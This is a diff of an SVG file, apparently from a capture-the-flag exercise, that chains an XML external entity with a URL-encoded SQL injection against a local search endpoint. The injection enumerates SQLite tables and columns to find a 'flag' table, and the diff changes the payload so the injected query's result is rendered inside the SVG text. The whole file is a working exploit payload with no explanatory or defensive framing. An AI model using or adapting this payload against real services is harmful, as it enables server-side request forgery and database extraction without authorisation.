@@ -1,7 +1,7 @@
 <!DOCTYPE svg [
-    <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/search?q=%27%20UNION%20SELECT%20name%2C%20name%20FROM%20pragma_table_info%28%28SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20name%20LIKE%20%27_%2525%27%29%29%20WHERE%20name%20LIKE%20%27flag_%2525%27%20--%20">
-    %xxe;
+    <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/search?q=%27%20UNION%20SELECT%20name%2C%20%27col_name%27%20FROM%20pragma_table_info%28%28SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20name%20LIKE%20%27_%2525%27%29%29%20WHERE%20name%20LIKE%20%27flag_%2525%27%20--%20">
+    <!ENTITY result "%xxe;">
 ]>
 <svg width="500" height="100" xmlns="http://www.w3.org/2000/svg">
-  <text x="10" y="20">Col Name:</text>
+  <text x="10" y="20">&result;</text>
 </svg>
